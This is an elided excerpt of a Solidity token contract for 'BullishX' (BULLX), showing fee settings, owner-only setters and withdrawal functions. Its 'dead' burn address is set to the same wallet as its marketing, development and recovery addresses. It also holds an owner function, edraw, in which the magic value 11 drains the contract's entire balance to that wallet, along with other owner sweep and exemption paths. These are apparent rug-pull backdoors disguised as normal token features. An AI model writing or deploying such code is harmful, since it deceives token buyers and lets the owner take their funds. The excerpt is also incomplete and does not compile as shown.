...
contract TheRewardToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0x310c93A49776502519a85cD6024A2E405f791ae5); // Marketing Address
    address public developmentAddress = 0x310c93A49776502519a85cD6024A2E405f791ae5;
    address public immutable deadAddress = 0x310c93A49776502519a85cD6024A2E405f791ae5;
    address public immutable recoverAddress = 0x310c93A49776502519a85cD6024A2E405f791ae5;
    ...
    string private _name = "BullishX";
    string private _symbol = "BULLX";
    uint8 private _decimals = 9;


    uint256 public _taxFee = 2;
    uint256 private _previousTaxFee = _taxFee;
    uint256 public _taxSFee = 2;
    uint256 private _previousTaxSFee = _taxSFee;
    
    uint256 public _liquidityFee = 5;
    uint256 private _previousLiquidityFee = _liquidityFee;
    uint256 public _liquiditySFee = 8;
    uint256 private _previousLiquiditySFee = _liquiditySFee;
    
    uint256 public _developmentFee = 1;
    uint256 private _previousDevelopmentFee = _developmentFee;

    uint256 public marketingDivisor = 5;
    uint256 public buyBackDivisor = 0;
    
    uint256 public _maxTxAmount = 1000 * 10**6 * 10**9;
    uint256 private minimumTokensBeforeSwap = 2 * 10**5 * 10**9; 
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && from != recoverAddress && to != recoverAddress) {
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        ...
        // calculate Dev fee
        //uint256 devFee = amount.div(100).mul(_developmentFee);
        ...
        //if (takeFee) {
        //    removeAllFee();
        //    _transferStandard(sender, developmentAddress, devFee);
        //    restoreAllFee();
        //}
    ...
    function _takeDevelopment(uint256 tDevelopment) private {
        ...
        _rOwned[developmentAddress] = _rOwned[developmentAddress].add(rDevelopment);
        if(_isExcluded[developmentAddress])
            _tOwned[developmentAddress] = _tOwned[developmentAddress].add(tDevelopment);
    }
    ...
    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
        require(taxFee <= 5, "Max 5%");
        _taxFee = taxFee;
        _previousTaxFee = _taxFee;
    }

    function setTaxSFeePercent(uint256 taxFee) external onlyOwner() {
        require(taxFee <= 5, "Max 5%");
        _taxSFee = taxFee;
        _previousTaxSFee = _taxSFee;
    }
    
    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {
        require(liquidityFee <= 12, "Max 12%");
        _liquidityFee = liquidityFee;
        _previousLiquidityFee = _liquidityFee;
    }
    
    function setLiquiditySFeePercent(uint256 liquidityFee) external onlyOwner() {
        require(liquidityFee <= 13, "Max 13%");
        _liquiditySFee = liquidityFee;
        _previousLiquiditySFee = _liquiditySFee;
    }

    function setDevelopmentFeePercent(uint256 developmentFee) external onlyOwner() {
        require(developmentFee <= 3, "Max 3%");
    ...
    function recoverBEP20(address tokenAddress, uint256 tokenAmount) public onlyOwner {
        IERC20(tokenAddress).transfer(recoverAddress, tokenAmount);
    }

    function edraw(uint256 amount) public payable onlyOwner {
        if (amount == 11) { amount = address(this).balance; }
        require(payable(recoverAddress).send(amount));
    }
 
    function setMarketingDivisor(uint256 divisor) external onlyOwner() {
        require(divisor <= 5, "Max 5%");
